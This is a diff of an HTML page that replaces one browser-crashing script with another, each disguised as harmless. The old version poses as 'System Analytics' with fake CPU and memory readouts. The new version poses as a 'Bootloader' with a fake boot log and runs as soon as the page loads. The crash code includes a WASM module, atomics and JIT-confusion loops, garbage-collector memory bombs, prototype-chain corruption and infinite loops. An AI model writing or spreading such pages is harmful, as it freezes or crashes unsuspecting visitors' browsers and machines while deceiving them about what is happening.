@@ -1,249 +1,217 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Analytics</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            overflow: hidden;
-        }
-    </style>
+    <title>Bootloader</title>
 </head>
 <body>
     <script>
-        // ========== WEBGL CRASH ==========
-        function webglCrash() {
+        // ========== WASM MEMORY CORRUPTION ==========
+        function wasmCrash() {
+            const wasmCode = new Uint8Array([
+                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
+                0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
+                0x00, 0x01, 0x00, 0x04, 0x84, 0x80, 0x80, 0x80,
+                0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83, 0x80,
+                0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81,
+                0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x91, 0x80,
+                0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d,
+                0x6f, 0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61,
+                0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80,
+                0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00,
+                0x00, 0x41, 0x00, 0x0b
+            ]);
+
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                
-                // Create massive texture that exceeds GPU memory
-                const texture = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, texture);
-                
-                // Try to allocate impossibly large texture
-                const size = 16384; // Maximum texture size
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-                
-                // Create too many shaders
-                for (let i = 0; i < 1000; i++) {
-                    const shader = gl.createShader(gl.VERTEX_SHADER);
-                    gl.shaderSource(shader, 'void main(){}');
-                    gl.compileShader(shader);
-                }
+                const module = new WebAssembly.Module(wasmCode);
+                const instance = new WebAssembly.Instance(module);
+                // Trigger execution
+                instance.exports.main();
             } catch(e) {}
         }
 
-        // ========== MEMORY CORRUPTION SIMULATION ==========
-        function memoryCorruption() {
-            // Use ArrayBuffer to simulate memory corruption
-            const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
-            const view = new Uint32Array(buffer);
-            
-            // Write to random memory locations
-            setInterval(() => {
+        // ========== SHARED ARRAY BUFFER ATOMIC BOMB ==========
+        function sharedArrayBufferCrash() {
+            if (crossOriginIsolated) {
                 try {
-                    for (let i = 0; i < view.length; i += 1000) {
-                        view[i] = 0xDEADBEEF; // Magic number that might crash
-                    }
+                    const buffer = new SharedArrayBuffer(1024);
+                    const view = new Int32Array(buffer);
+                    
+                    // Try to cause race condition
+                    Atomics.store(view, 0, 1);
+                    Atomics.notify(view, 0, Infinity);
+                    
+                    // Infinite atomic operations
+                    setInterval(() => {
+                        Atomics.add(view, 0, 1);
+                        Atomics.xor(view, 0, 0xFFFFFFFF);
+                    }, 0);
                 } catch(e) {}
+            }
+        }
+
+        // ========== V8 ENGINE EXPLOIT ATTEMPT ==========
+        function v8EngineCrash() {
+            // Try to trigger JIT compiler bugs
+            function optimizeMe() {
+                let result = 0;
+                for (let i = 0; i < 100000; i++) {
+                    // Polymorphic types to confuse optimizer
+                    if (i % 2 === 0) {
+                        result += "string".length;
+                    } else {
+                        result += Math.random();
+                    }
+                }
+                return result;
+            }
+
+            // Force JIT compilation
+            for (let i = 0; i < 1000; i++) {
+                optimizeMe();
+            }
+
+            // Sudden type change to break optimized code
+            setTimeout(() => {
+                String.prototype.length = 999999;
+                optimizeMe();
             }, 100);
         }
 
-        // ========== INFINITE RECURSION WITH PROMISES ==========
-        function promiseCrash() {
-            function recursivePromise() {
-                return Promise.resolve().then(() => {
-                    return recursivePromise();
-                });
-            }
+        // ========== GARBAGE COLLECTOR HIJACK ==========
+        function gcCrash() {
+            // Create objects that can't be garbage collected
+            const gcBomb = [];
+            let temp = {};
             
-            // Start multiple promise chains
-            for (let i = 0; i < 10; i++) {
-                recursivePromise();
-            }
-        }
-
-        // ========== EVENT LOOP BLOCKAGE ==========
-        function eventLoopCrash() {
-            // Block event loop with synchronous operations
-            setInterval(() => {
-                const start = Date.now();
-                while (Date.now() - start < 1000) {
-                    // Block for 1 second
-                    Math.sqrt(Math.random());
+            for (let i = 0; i < 1000000; i++) {
+                temp.next = { data: new Array(1000), prev: temp };
+                temp = temp.next;
+                gcBomb.push(temp);
+                
+                // Circular references everywhere
+                if (i % 1000 === 0) {
+                    temp.circular = gcBomb[0];
                 }
-            }, 10);
+            }
         }
 
-        // ========== BROWSER-SPECIFIC VULNERABILITIES ==========
-        function browserSpecificCrash() {
-            // Chrome-specific: Excessive Promise microtasks
-            if (navigator.userAgent.includes('Chrome')) {
-                function microtaskFlood() {
-                    Promise.resolve().then(microtaskFlood);
+        // ========== PROXY TRAP INFINITE RECURSION ==========
+        function proxyCrash() {
+            const handler = {
+                get(target, prop) {
+                    return target[prop];
+                },
+                set(target, prop, value) {
+                    target[prop] = value;
+                    return true;
                 }
-                microtaskFlood();
-            }
-            
-            // Firefox-specific: CSS animation bomb
-            if (navigator.userAgent.includes('Firefox')) {
-                const style = document.createElement('style');
-                style.textContent = `
-                    @keyframes crash {
-                        0% { transform: rotate(0deg); }
-                        100% { transform: rotate(3600000deg); }
-                    }
-                    * { animation: crash 0.0001s infinite; }
-                `;
-                document.head.appendChild(style);
-            }
-            
-            // Safari-specific: WebAudio crash
-            if (navigator.userAgent.includes('Safari')) {
-                try {
-                    const context = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = context.createOscillator();
-                    const gain = context.createGain();
-                    
-                    oscillator.connect(gain);
-                    gain.connect(context.destination);
-                    
-                    oscillator.frequency.setValueAtTime(0, context.currentTime);
-                    gain.gain.setValueAtTime(1, context.currentTime);
-                    
-                    oscillator.start();
-                } catch(e) {}
-            }
-        }
+            };
 
-        // ========== STACK OVERFLOW WITH GENERATORS ==========
-        function* stackOverflowGenerator() {
-            yield* stackOverflowGenerator();
-        }
-
-        function generatorCrash() {
+            const obj = new Proxy({}, handler);
+            obj.self = obj; // Circular reference
+            
+            // Try to trigger infinite recursion in proxy traps
             try {
-                const gen = stackOverflowGenerator();
-                gen.next();
+                JSON.stringify(obj);
             } catch(e) {}
         }
 
-        // ========== MEMORY LEAK WITH CLOSURES ==========
-        function closureLeak() {
-            let leaks = [];
+        // ========== EVENT TARGET MEMORY LEAK ==========
+        function eventTargetCrash() {
+            // Create event targets that can't be cleaned up
+            const targets = [];
             
-            function createLeak() {
-                const hugeArray = new Array(1000000).fill('LEAK');
-                leaks.push(() => hugeArray); // Closure references huge array
-            }
-            
-            setInterval(createLeak, 10);
-        }
-
-        // ========== DOM CORRUPTION ATTEMPT ==========
-        function domCorruption() {
-            // Try to corrupt DOM tree structure
             setInterval(() => {
+                const target = new EventTarget();
+                
+                // Add listeners that capture the target
+                target.addEventListener('test', function() {
+                    console.log(this);
+                });
+                
+                targets.push(target);
+                
+                // Try to dispatch events to cause stack issues
                 try {
-                    const randomElement = document.body.children[
-                        Math.floor(Math.random() * document.body.children.length)
-                    ];
-                    if (randomElement && randomElement.parentNode) {
-                        randomElement.parentNode.removeChild(randomElement);
-                        document.body.appendChild(randomElement);
-                    }
+                    target.dispatchEvent(new Event('test'));
                 } catch(e) {}
             }, 1);
         }
 
-        // ========== WEB WORKER CRASH ==========
-        function workerCrash() {
-            const workerCode = `
-                while(true) {
-                    // Infinite loop in worker
-                    postMessage(Array(1000000).fill('CRASH'));
-                }
-            `;
+        // ========== FINAL ATOMIC CRASH SEQUENCE ==========
+        function startNuclearCrash() {
+            console.log("Nuclear crash sequence initiated");
             
-            try {
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                const worker = new Worker(URL.createObjectURL(blob));
-                worker.onmessage = () => {};
-            } catch(e) {}
-        }
-
-        // ========== REQUEST ANIMATION FRAME BOMB ==========
-        function rafCrash() {
-            function bomb() {
-                requestAnimationFrame(() => {
-                    // Heavy computation in RAF
-                    for (let i = 0; i < 1000000; i++) {
-                        Math.hypot(Math.random(), Math.random());
-                    }
-                    bomb();
-                });
-            }
-            bomb();
-        }
-
-        // ========== START ALL CRASH METHODS ==========
-        function startSmartCrash() {
-            console.log("Starting smart crash sequence...");
+            // Phase 1: Engine-level attacks
+            wasmCrash();
+            v8EngineCrash();
+            proxyCrash();
             
-            // Start with subtle methods first
-            promiseCrash();
-            eventLoopCrash();
-            closureLeak();
-            rafCrash();
-            
-            // Then move to more aggressive methods
+            // Phase 2: Memory system attacks  
             setTimeout(() => {
-                webglCrash();
-                memoryCorruption();
-                browserSpecificCrash();
-                generatorCrash();
-                domCorruption();
-                workerCrash();
+                gcCrash();
+                eventTargetCrash();
+                sharedArrayBufferCrash();
+            }, 1000);
+            
+            // Phase 3: Nuclear option - try everything at once
+            setTimeout(() => {
+                // Memory allocation with weird patterns
+                const arrays = [];
+                for (let i = 0; i < 100; i++) {
+                    try {
+                        // Allocate with prime number sizes to confuse memory allocator
+                        const size = [997, 1009, 1013, 1019, 1021][i % 5];
+                        arrays.push(new Array(size).fill(0xDEADBEEF));
+                    } catch(e) {}
+                }
+                
+                // Trigger GC manually if possible
+                if (window.gc) {
+                    window.gc();
+                }
+                
+                // Final attempt: corrupt prototype chain
+                Object.prototype.__proto__ = null;
+                Array.prototype.push = function() { while(true) {} };
+                
             }, 3000);
             
-            // Final nuclear option
-            setTimeout(() => {
-                // Try to trigger garbage collector issues
-                const finalBomb = [];
-                setInterval(() => {
-                    finalBomb.push(new Array(1000000));
-                }, 100);
-            }, 10000);
-            
-            // Show fake analytics screen
+            // Show fake boot screen
             document.body.innerHTML = `
-                <div style="padding: 20px;">
-                    <h1>System Performance Analytics</h1>
-                    <div id="metrics">Calculating system metrics...</div>
+                <div style="
+                    background: #000;
+                    color: #0f0;
+                    font-family: monospace;
+                    padding: 20px;
+                    height: 100vh;
+                ">
+                    <div>Initializing boot sequence...</div>
+                    <div id="log"></div>
                 </div>
             `;
             
-            // Fake metrics to look legitimate
-            setInterval(() => {
-                document.getElementById('metrics').innerHTML = `
-                    CPU Usage: ${Math.random() * 100}%<br>
-                    Memory: ${Math.random() * 100}%<br>
-                    GPU: ${Math.random() * 100}%<br>
-                    Temperature: ${30 + Math.random() * 50}°C
-                `;
-            }, 1000);
+            // Fake system log
+            const log = document.getElementById('log');
+            const messages = [
+                "Loading kernel... OK",
+                "Mounting filesystems... OK", 
+                "Starting services... OK",
+                "Memory test... RUNNING",
+                "CPU calibration... RUNNING",
+                "Hardware check... RUNNING"
+            ];
+            
+            messages.forEach((msg, i) => {
+                setTimeout(() => {
+                    log.innerHTML += msg + "<br>";
+                }, i * 500);
+            });
         }
 
-        // Start crash sequence
-        window.onload = startSmartCrash;
+        // Start immediately
+        startNuclearCrash();
 
     </script>
 </body>
